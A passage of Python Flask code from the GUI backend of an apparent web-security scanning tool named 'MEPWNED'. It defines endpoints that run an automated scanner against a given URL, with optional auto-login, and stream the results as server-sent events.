    timeout_sec = int(data.get("timeout", 10))

    if not base_url:
        return jsonify({"error": "base_url required"}), 400

    import asyncio as _aio

    async def _run():
        scanner = mod.AutoScanner(base_url, session_cookie, concurrency, timeout_sec)
        # Auto-login if credentials provided and no session
        login_result = None
        if email and password and not session_cookie:
            ok, msg = await scanner.auto_login(email, password)
            login_result = {"success": ok, "message": msg}
        await scanner.run_all()
        report = scanner.build_report()
        return report, login_result

    loop = _aio.new_event_loop()
    try:
        report, login_result = loop.run_until_complete(_run())
    finally:
        loop.close()

    from dataclasses import asdict as _asdict
    report_dict = _asdict(report)
    if login_result:
        report_dict["login"] = login_result
    return jsonify(report_dict)


@app.route("/api/autoscan/stream", methods=["POST"])
def api_autoscan_stream():
    """Run autoscan with SSE streaming (one event per test result)."""
    data = request.get_json() or {}
    base_url = data.get("base_url", "").strip().rstrip("/")
    session_cookie = data.get("session", "")
    concurrency = int(data.get("concurrency", 10))
    timeout_sec = int(data.get("timeout", 10))

    if not base_url:
        return jsonify({"error": "base_url required"}), 400

    def generate():
        import importlib.util, asyncio as _aio
        spec = importlib.util.spec_from_file_location("autoscan", os.path.join(CLI, "autoscan.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)

        results_queue = []

        def on_result(r):
            from dataclasses import asdict as _ad
            results_queue.append(_ad(r))

        async def _run():
            scanner = mod.AutoScanner(base_url, session_cookie, concurrency, timeout_sec)
            await scanner.run_all(progress_cb=on_result)
            return scanner.build_report()

        loop = _aio.new_event_loop()
        try:
            report = loop.run_until_complete(_run())
        finally:
            loop.close()

        # Emit each result
        from dataclasses import asdict as _ad
        for r in results_queue:
            yield f"data: {json.dumps({'type': 'result', 'data': r})}\n\n"

        # Emit final summary
        yield f"data: {json.dumps({'type': 'complete', 'data': _ad(report)})}\n\n"

    return Response(stream_with_context(generate()),
                    content_type="text/event-stream",
                    headers={"X-Accel-Buffering": "no", "Cache-Control": "no-cache"})


if __name__ == "__main__":
    print("\033[92m[+]\033[0m MEPWNED GUI starting → http://127.0.0.1:5000\n")
    app.run(debug=False, threaded=True, host="127.0.0.1", port=5000)
